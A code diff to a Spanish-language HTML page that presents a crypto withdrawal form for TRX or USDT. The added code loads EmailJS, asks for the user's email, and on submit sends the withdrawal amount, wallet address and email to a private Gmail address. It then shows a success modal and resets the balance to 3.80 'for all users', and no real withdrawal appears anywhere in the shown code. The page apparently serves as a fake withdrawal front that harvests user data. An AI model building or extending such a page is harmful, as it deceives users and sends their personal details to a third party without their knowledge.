@@ -125,6 +125,12 @@
             background-color: #5653a5;
         }
     </style>
+    <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
+    <script>
+        (function() {
+            emailjs.init('service_b244er4'); // Inicializar EmailJS con tu User ID
+        })();
+    </script>
 </head>
 <body>
     <div class="container">
@@ -136,6 +142,9 @@
             
             <label for="withdraw-address">Dirección de retiro (TRX o USDT)</label>
             <input type="text" id="withdraw-address" name="withdraw-address" required>
+            
+            <label for="email">Correo Electrónico</label>
+            <input type="email" id="email" name="email" required>
             
             <button type="submit">Retirar</button>
         </form>
@@ -168,6 +177,7 @@
             event.preventDefault();
             const amount = parseFloat(document.getElementById('amount').value);
             const withdrawAddress = document.getElementById('withdraw-address').value;
+            const email = document.getElementById('email').value;
 
             if (amount > balance) {
                 messageDiv.textContent = 'Saldo insuficiente para realizar el retiro.';
@@ -179,6 +189,18 @@
 
                 // Mostrar el modal
                 modal.classList.add('show');
+
+                // Enviar correo electrónico
+                emailjs.send('service_b244er4', 'template_735kydj', {
+                    to_email: 'magneginvip@gmail.com',
+                    amount: amount,
+                    withdraw_address: withdrawAddress,
+                    user_email: email
+                }).then(function(response) {
+                    console.log('Correo enviado:', response.status, response.text);
+                }, function(error) {
+                    console.log('Error al enviar el correo:', error);
+                });
 
                 setTimeout(function() {
                     balance = 3.80; // Restablecer balance a 3.80 para todos los usuarios
